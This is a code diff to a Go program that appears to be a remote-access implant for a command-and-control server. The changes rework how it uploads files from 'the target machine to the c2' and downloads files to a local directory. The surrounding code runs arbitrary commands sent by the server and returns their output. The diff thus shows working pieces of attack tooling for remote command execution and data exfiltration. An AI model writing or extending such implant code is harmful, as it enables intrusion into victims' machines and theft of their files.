@@ -73,13 +73,15 @@ func ProcessCmd(client *http.Client, cmd string, host string) {
 		fmt.Println("[+] Quitting due to quit cmd from c2")
 		os.Exit(0)
 	} else if strings.Contains(cmd, "upload") {
-		filePath := strings.Split(cmd, " ")[1]
-		UploadFile(client, host+uploadFileURL, filePath)
+		cmdTokens := strings.Split(cmd, " ")
+		localFilePath := cmdTokens[1]
+		remoteFilePath := cmdTokens[2]
+		UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
 	} else if strings.Contains(cmd, "download") {
 		cmdTokens := strings.Split(cmd, " ")
-		remoteFile := cmdTokens[1]
-		localFileName := cmdTokens[2]
-		DownloadFile(client, host+downloadFileURL+"?file="+remoteFile, localFileName)
+		remoteFilePath := cmdTokens[1]
+		localFilePath := cmdTokens[2]
+		DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
 	} else {
 		out := ExecAndGetOutput(string(cmd))
 		fmt.Printf("[+] Sending back output:\n%s\n", string(out))
@@ -88,9 +90,9 @@ func ProcessCmd(client *http.Client, cmd string, host string) {
 }
 
 // UploadFile uploads a local file on the target machine to the c2.
-func UploadFile(client *http.Client, url string, filePath string) {
+func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
 	// open the file of interest
-	file, err := os.Open(filePath)
+	file, err := os.Open(localFilePath)
 	if err != nil {
 		fmt.Printf("[-] Error opening file: %s\n", err)
 		return
@@ -100,7 +102,7 @@ func UploadFile(client *http.Client, url string, filePath string) {
 	// create the form file
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
-	part, err := writer.CreateFormFile("uploadFile", filepath.Base(filePath))
+	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
 	if err != nil {
 		fmt.Printf("[-] Error creating form file: %s\n", err)
 		return
@@ -140,6 +142,8 @@ func DownloadFile(client *http.Client, url string, filePath string) {
 	}
 	defer resp.Body.Close()
 
+	// create downloads dir if not existant yet
+	_ = os.Mkdir("downloads", 0755)
 	// create local file
 	out, err := os.Create("downloads/" + filePath)
 	if err != nil {
